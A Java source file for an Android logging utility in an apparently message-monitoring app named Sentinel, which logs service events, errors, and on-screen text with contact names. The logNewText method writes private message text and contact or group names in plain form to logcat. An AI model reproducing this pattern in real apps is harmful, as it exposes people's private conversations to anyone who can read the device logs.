package com.sentinel.utils;

import android.content.Context;
import android.util.Log;

import com.sentinel.config.ServiceConfig;

/**
 * Manages logging to Android logcat system.
 * Provides formatted logging with timestamps and context information.
 */
public class LoggingManager {
    
    private static final String TAG = "LoggingManager";
    
    private final Context context;
    private final ServiceConfig serviceConfig;
    
    public LoggingManager(Context context) {
        this.context = context;
        this.serviceConfig = new ServiceConfig(context);
    }
    
    /**
     * Log service started event
     */
    public void logServiceStarted() {
        String message = "Sentinel monitoring service started";
        Log.i(serviceConfig.getLogTag(), message);
    }
    
    /**
     * Log service stopped event
     */
    public void logServiceStopped() {
        String message = "Sentinel monitoring service stopped";
        Log.i(serviceConfig.getLogTag(), message);
    }
    
    
    /**
     * Log error event
     */
    public void logError(String errorType, String errorMessage) {
        String message = "ERROR [" + errorType + "]: " + errorMessage;
        Log.e(serviceConfig.getLogTag(), message);
    }
    
    
    /**
     * Log info event
     */
    public void logInfo(String infoType, String infoMessage) {
        String message = "INFO [" + infoType + "]: " + infoMessage;
        Log.i(serviceConfig.getLogTag(), message);
    }
    
    
    
    
    
    
    /**
     * Log new text detected during scrolling
     */
    public void logNewText(String contactOrGroup, String text) {
        String message = "NEW_TEXT [Contact: " + (contactOrGroup != null ? contactOrGroup : "Unknown") + 
                        "] [Text: \"" + text + "\"] [Timestamp: " + ScreenReader.getFormattedTimestamp() + "]";
        Log.i(serviceConfig.getLogTag(), message);
    }
    
    /**
     * Cleanup resources
     */
    public void cleanup() {
        Log.d(TAG, "LoggingManager cleaned up");
    }
}
